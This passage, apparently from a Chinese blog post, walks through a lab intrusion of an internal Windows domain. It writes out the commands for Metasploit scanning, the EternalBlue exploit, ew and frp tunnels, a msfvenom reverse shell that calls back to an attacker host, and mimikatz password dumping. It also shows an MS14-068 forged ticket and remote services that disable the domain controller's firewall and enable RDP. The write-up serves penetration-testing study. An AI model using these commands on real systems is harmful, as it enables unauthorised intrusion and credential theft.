&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;background&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;post&lt;/span&gt;/multi/manage/autoroute&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; session x&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;代理转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理转发&#34;&gt;#&lt;/a&gt; 代理转发&lt;/h3&gt;
&lt;h4 id=&#34;使用ew代理转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用ew代理转发&#34;&gt;#&lt;/a&gt; 使用 ew 代理转发&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;上传 ew_for_linux64&lt;/li&gt;
&lt;li&gt;执行 &lt;code&gt;./ew -s ssocksd -l 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot&lt;/li&gt;
&lt;li&gt;在需要代理时，执行命令如 &lt;code&gt;proxychains4 curl http://127.0.0.1:2003/&lt;/code&gt;  即可&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ubuntu信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ubuntu信息收集&#34;&gt;#&lt;/a&gt; Ubuntu 信息收集&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msf 进行一波存活扫描&lt;/p&gt;
&lt;figure class=&#34;highlight gams&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gams&#34;&gt;use auxiliary/scanner/discovery/udp_probe&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; rhosts &lt;span class=&#34;hljs-comment&#34;&gt;192.168.183.0-255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;threads 5&lt;/span&gt;&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到有 128、130 两台机子。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扫一下 ms17-010&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/smb/smb_ms&lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;_&lt;span class=&#34;hljs-number&#34;&gt;010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;set&lt;/span&gt; rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.128&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。&lt;/p&gt;
&lt;figure class=&#34;highlight gams&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gams&#34;&gt;setg Proxies socks5:&lt;span class=&#34;hljs-number&#34;&gt;10.0&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.5&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.100&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8888&lt;/span&gt;					&lt;span class=&#34;hljs-comment&#34;&gt;//MSF走ew的代理&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; ReverseAllowProxy &lt;span class=&#34;hljs-comment&#34;&gt;true&lt;/span&gt;							//开启反向代理&lt;br&gt;use &lt;span class=&#34;hljs-comment&#34;&gt;exploit&lt;/span&gt;/windows/&lt;span class=&#34;hljs-comment&#34;&gt;smb&lt;/span&gt;/ms17_010_eternalblue&lt;br&gt;set payload windows/&lt;span class=&#34;hljs-comment&#34;&gt;x64&lt;/span&gt;/meterpreter/&lt;span class=&#34;hljs-comment&#34;&gt;bind_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;rhost 192.168.183.128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;AutoRunScript post&lt;/span&gt;/windows/&lt;span class=&#34;hljs-comment&#34;&gt;manage&lt;/span&gt;/migrate       &lt;span class=&#34;hljs-comment&#34;&gt;//自动迁移进程&lt;/span&gt;&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功拿下 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7权限维持&#34;&gt;#&lt;/a&gt; Win7 权限维持&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拿 ubuntu 当作跳板机，把 frps 传到 ubuntu 上，不修改配置，直接执行 &lt;code&gt;./frps -c ./frps.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png&#34; alt=&#34;image-20211112170138230&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;把 frpc 上传到自己的 CS 服务器，修改 frpc.ini 后启动 frpc： &lt;code&gt;./frpc -c ./frpc.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png&#34; alt=&#34;image-20211112170249583&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CS 创建一个 ip 为 ubuntu 的监听器&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png&#34; alt=&#34;image-20211112170412976&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;生成马传到 win7 上执行即可上线&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png&#34; alt=&#34;image-20211112170455408&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.128 LPORT=4455 -f exe -o mshell.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7信息收集&#34;&gt;#&lt;/a&gt; Win7 信息收集&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;route print&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png&#34; alt=&#34;image-20211112171015589&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;net user /domain&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;net user&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;net view&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nslookup WIN-ENS2VR5TR3N&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png&#34; alt=&#34;image-20211112171507481&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7提权&#34;&gt;#&lt;/a&gt; Win7 提权&lt;/h3&gt;
&lt;p&gt;先 systeminfo 拿到补丁列表，使用 http://bugs.hacking8.com/tiquan/ 直接查询可用 exp，发现 MS16-135 可用，直接梼杌 MS16-135 提权一把梭&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png&#34; alt=&#34;image-20211114004439133&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到新 shell，尝试用猕猴桃拿密码&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png&#34; alt=&#34;image-20211114004938173&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mimikatz sekurlsa::logonpasswords&lt;/code&gt;  拿到明文密码&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png&#34; alt=&#34;image-20211114005145157&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;win7打域控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7打域控&#34;&gt;#&lt;/a&gt; Win7 打域控&lt;/h3&gt;
&lt;p&gt;同样的，使用 http://bugs.hacking8.com/tiquan/ 发现可以用 MS14-068，工具：&lt;a href=&#34;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&#34;&gt;https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;用收集到的 sid、成员名、密码伪造票据&lt;/p&gt;
&lt;figure class=&#34;highlight subunit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs subunit&#34;&gt;//ms14&lt;span class=&#34;hljs-string&#34;&gt;-068&lt;/span&gt;.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码&lt;br&gt;&lt;br&gt;ms14&lt;span class=&#34;hljs-string&#34;&gt;-068&lt;/span&gt;.exe -u douser@DEMO.com -s S&lt;span class=&#34;hljs-string&#34;&gt;-1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-5&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-21&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-979886063&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-1111900045&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-1414766810&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;-1107&lt;/span&gt; -d 192.168.183.130 -p Dotest123&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png&#34; alt=&#34;image-20211114010319666&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;用猕猴桃注入票据&lt;/p&gt;
&lt;figure class=&#34;highlight dts&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;mimikatz kerberos::purge         &lt;span class=&#34;hljs-comment&#34;&gt;//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造&lt;/span&gt;&lt;br&gt;mimikatz kerberos::list          &lt;span class=&#34;hljs-comment&#34;&gt;//查看当前机器凭证&lt;/span&gt;&lt;br&gt;mimikatz kerberos::ptc &lt;span class=&#34;hljs-params&#34;&gt;&amp;lt;生成的票据文件&amp;gt;&lt;/span&gt;   &lt;span class=&#34;hljs-comment&#34;&gt;//将票据注入到内存中&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png&#34; alt=&#34;image-20211114010623765&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试查看域控的 C 盘&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;net&lt;/span&gt; use \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;dir&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N\c$&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png&#34; alt=&#34;image-20211114010832260&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;域控维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域控维权&#34;&gt;#&lt;/a&gt; 域控维权&lt;/h3&gt;
&lt;p&gt;再生成一个 CS 马，通过 win7 传到 DC 上&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png&#34; alt=&#34;image-20211114011638641&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;关掉 DC 的防火墙&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N create unablefirewall binpath= &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;netsh advfirewall set allprofiles state off&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N start unablefirewall&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png&#34; alt=&#34;image-20211114011840038&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行 shell&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N create bindshell binpath= &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;c:\cshell2.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N start bindshell&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到 130 的新 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png&#34; alt=&#34;image-20211114012104545&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;猕猴桃拿密码&lt;/p&gt;
&lt;figure class=&#34;highlight arduino&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;mimikatz privilege::debug&lt;br&gt;mimikatz sekurlsa::logonpasswords&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png&#34; alt=&#34;image-20211114012906263&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到明文密码&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png&#34; alt=&#34;image-20211114013013491&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;开启 3389&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;Server &lt;span class=&#34;hljs-regexp&#34;&gt;/v fDenyTSConnections /&lt;/span&gt;t REG_DWORD &lt;span class=&#34;hljs-regexp&#34;&gt;/d 0 /&lt;/span&gt;f&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png&#34; alt=&#34;image-20211114013625435&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 kali 的 RDP 工具，走之前的 ew 代理连接&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains4 rdesktop 192.168.183.130&lt;/code&gt;&lt;/p&gt;
